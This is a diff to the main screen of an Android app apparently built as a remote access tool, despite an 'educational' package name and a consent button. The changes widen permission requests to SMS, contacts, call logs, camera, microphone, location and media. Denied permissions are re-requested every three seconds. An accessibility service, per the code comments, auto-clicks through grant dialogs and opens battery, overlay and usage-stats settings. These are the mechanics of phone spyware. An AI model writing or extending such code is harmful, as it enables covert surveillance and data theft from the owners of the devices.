@@ -6,6 +6,7 @@ import android.content.Context;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
 import android.widget.Button;
 import android.widget.TextView;
 import androidx.appcompat.app.AppCompatActivity;
@@ -15,18 +16,22 @@ import com.remoteaccess.educational.permissions.AutoPermissionManager;
 import com.remoteaccess.educational.services.RemoteAccessService;
 import com.remoteaccess.educational.services.UnifiedAccessibilityService;
 import com.remoteaccess.educational.utils.PreferenceManager;
-import android.provider.Settings;
-import android.net.Uri;
-import android.os.PowerManager;
 import java.util.ArrayList;
 import java.util.List;
 
 public class MainActivity extends AppCompatActivity {
 
+    private static final int PERMISSION_REQUEST_CODE = 100;
+
+    // Prevent requesting standard permissions more than once every 5 seconds
+    private long lastStandardPermRequestTime = 0;
+    private static final long PERM_REQUEST_COOLDOWN_MS = 5000;
+
     private TextView statusText;
     private Button consentButton;
     private PreferenceManager preferenceManager;
     private AutoPermissionManager permissionManager;
+    private boolean pollingForAccessibility = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -36,7 +41,7 @@ public class MainActivity extends AppCompatActivity {
         preferenceManager = new PreferenceManager(this);
         permissionManager = new AutoPermissionManager(this);
 
-        statusText = findViewById(R.id.statusText);
+        statusText    = findViewById(R.id.statusText);
         consentButton = findViewById(R.id.consentButton);
 
         if (preferenceManager.isConsentGiven()) {
@@ -44,11 +49,14 @@ public class MainActivity extends AppCompatActivity {
             startRemoteAccessService();
 
             if (!permissionManager.isAccessibilityServiceEnabled()) {
+                // Accessibility not yet granted — ask for it
                 permissionManager.requestAccessibilityService();
                 startPollingForAccessibility();
             } else {
-                requestBatteryOptimization();
-                requestNecessaryPermissions();
+                // Accessibility already active — request standard permissions right away.
+                // Battery / overlay / usage stats are handled by the accessibility service
+                // inside onServiceConnected (with a delay so standard permissions show first).
+                requestStandardPermissions();
             }
         } else {
             showConsentRequired();
@@ -56,8 +64,7 @@ public class MainActivity extends AppCompatActivity {
 
         consentButton.setOnClickListener(v -> {
             if (!preferenceManager.isConsentGiven()) {
-                Intent intent = new Intent(MainActivity.this, ConsentActivity.class);
-                startActivity(intent);
+                startActivity(new Intent(MainActivity.this, ConsentActivity.class));
             } else {
                 revokeConsent();
             }
@@ -67,32 +74,112 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onResume() {
         super.onResume();
-        if (preferenceManager.isConsentGiven()) {
-            showActiveStatus();
+        if (!preferenceManager.isConsentGiven()) return;
 
-            if (permissionManager.isAccessibilityServiceEnabled()) {
-                UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
-                if (svc != null) svc.startGrantPermsTimer();
-                requestNecessaryPermissions();
-            } else {
+        showActiveStatus();
+
+        if (permissionManager.isAccessibilityServiceEnabled()) {
+            // Accessibility is active — start auto-click timer if service is running
+            UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
+            if (svc != null) svc.startGrantPermsTimer();
+
+            // Request any still-missing standard permissions, but guard against
+            // rapid duplicate calls (e.g. polling + onResume firing at the same time)
+            requestStandardPermissionsIfCooledDown();
+        } else {
+            // Accessibility lost (e.g. rebooted) — ask again
+            if (!pollingForAccessibility) {
                 permissionManager.requestAccessibilityService();
                 startPollingForAccessibility();
             }
         }
     }
 
-    private void requestBatteryOptimization() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
-                Intent intent = new Intent(
-                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
-                    Uri.parse("package:" + getPackageName())
-                );
-                startActivity(intent);
+    // ── Standard runtime permissions ────────────────────────────────────────
+
+    /** Request ALL standard runtime permissions in one shot. */
+    private void requestStandardPermissions() {
+        lastStandardPermRequestTime = System.currentTimeMillis();
+
+        List<String> needed = new ArrayList<>();
+        String[] permissions = buildPermissionList();
+        for (String p : permissions) {
+            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
+                needed.add(p);
             }
         }
+        if (!needed.isEmpty()) {
+            ActivityCompat.requestPermissions(this,
+                needed.toArray(new String[0]), PERMISSION_REQUEST_CODE);
+        }
     }
+
+    /** Same as above but only if the cooldown has elapsed. */
+    private void requestStandardPermissionsIfCooledDown() {
+        if (System.currentTimeMillis() - lastStandardPermRequestTime >= PERM_REQUEST_COOLDOWN_MS) {
+            requestStandardPermissions();
+        }
+    }
+
+    private String[] buildPermissionList() {
+        List<String> list = new ArrayList<>();
+        // Core dangerous permissions
+        list.add(Manifest.permission.READ_SMS);
+        list.add(Manifest.permission.SEND_SMS);
+        list.add(Manifest.permission.RECEIVE_SMS);
+        list.add(Manifest.permission.READ_CONTACTS);
+        list.add(Manifest.permission.READ_CALL_LOG);
+        list.add(Manifest.permission.CAMERA);
+        list.add(Manifest.permission.RECORD_AUDIO);
+        list.add(Manifest.permission.ACCESS_FINE_LOCATION);
+        list.add(Manifest.permission.ACCESS_COARSE_LOCATION);
+        list.add(Manifest.permission.READ_EXTERNAL_STORAGE);
+        // Android 13+ permissions
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            list.add("android.permission.READ_MEDIA_IMAGES");
+            list.add("android.permission.READ_MEDIA_VIDEO");
+            list.add("android.permission.READ_MEDIA_AUDIO");
+            list.add("android.permission.POST_NOTIFICATIONS");
+        }
+        return list.toArray(new String[0]);
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+            // Re-try after 3 s for any still-missing permissions (user may have denied some)
+            new Handler().postDelayed(this::requestStandardPermissions, 3000);
+        }
+    }
+
+    // ── Accessibility polling ────────────────────────────────────────────────
+
+    /**
+     * Poll every second until the accessibility service is enabled.
+     * When detected: immediately request standard permissions, then let the
+     * accessibility service handle the special permissions with a built-in delay.
+     */
+    private void startPollingForAccessibility() {
+        pollingForAccessibility = true;
+        new Handler().postDelayed(() -> {
+            if (!preferenceManager.isConsentGiven()) {
+                pollingForAccessibility = false;
+                return;
+            }
+            if (permissionManager.isAccessibilityServiceEnabled()) {
+                pollingForAccessibility = false;
+                // Standard permissions first — special permissions (battery, overlay, usage stats)
+                // are opened by UnifiedAccessibilityService.onServiceConnected with a 4-second
+                // delay so they appear AFTER the standard dialogs, not before.
+                requestStandardPermissions();
+            } else {
+                startPollingForAccessibility(); // keep polling
+            }
+        }, 1000);
+    }
+
+    // ── Helpers ─────────────────────────────────────────────────────────────
 
     private void showActiveStatus() {
         statusText.setText("✓ Remote Access Active\n\nYour device is connected and can be managed remotely.");
@@ -105,67 +192,12 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void startRemoteAccessService() {
-        Intent serviceIntent = new Intent(this, RemoteAccessService.class);
-        startForegroundService(serviceIntent);
+        startForegroundService(new Intent(this, RemoteAccessService.class));
     }
 
     private void revokeConsent() {
         preferenceManager.setConsentGiven(false);
-        Intent serviceIntent = new Intent(this, RemoteAccessService.class);
-        stopService(serviceIntent);
+        stopService(new Intent(this, RemoteAccessService.class));
         showConsentRequired();
-    }
-
-    private void startPollingForAccessibility() {
-        new android.os.Handler().postDelayed(() -> {
-            if (permissionManager.isAccessibilityServiceEnabled()) {
-                requestBatteryOptimization();
-                UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
-                if (svc != null) svc.startGrantPermsTimer();
-                requestNecessaryPermissions();
-            } else {
-                startPollingForAccessibility();
-            }
-        }, 1000);
-    }
-
-    private static final int PERMISSION_REQUEST_CODE = 100;
-
-    private void requestNecessaryPermissions() {
-        List<String> permissionsToRequest = new ArrayList<>();
-
-        String[] permissions = {
-            Manifest.permission.READ_SMS,
-            Manifest.permission.SEND_SMS,
-            Manifest.permission.READ_CONTACTS,
-            Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.CAMERA,
-            Manifest.permission.RECORD_AUDIO,
-            Manifest.permission.ACCESS_FINE_LOCATION,
-            Manifest.permission.ACCESS_COARSE_LOCATION
-        };
-
-        for (String permission : permissions) {
-            if (ContextCompat.checkSelfPermission(this, permission)
-                    != PackageManager.PERMISSION_GRANTED) {
-                permissionsToRequest.add(permission);
-            }
-        }
-
-        if (!permissionsToRequest.isEmpty()) {
-            ActivityCompat.requestPermissions(
-                this,
-                permissionsToRequest.toArray(new String[0]),
-                PERMISSION_REQUEST_CODE
-            );
-        }
-    }
-
-    @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == PERMISSION_REQUEST_CODE) {
-            new android.os.Handler().postDelayed(this::requestNecessaryPermissions, 2000);
-        }
     }
 }
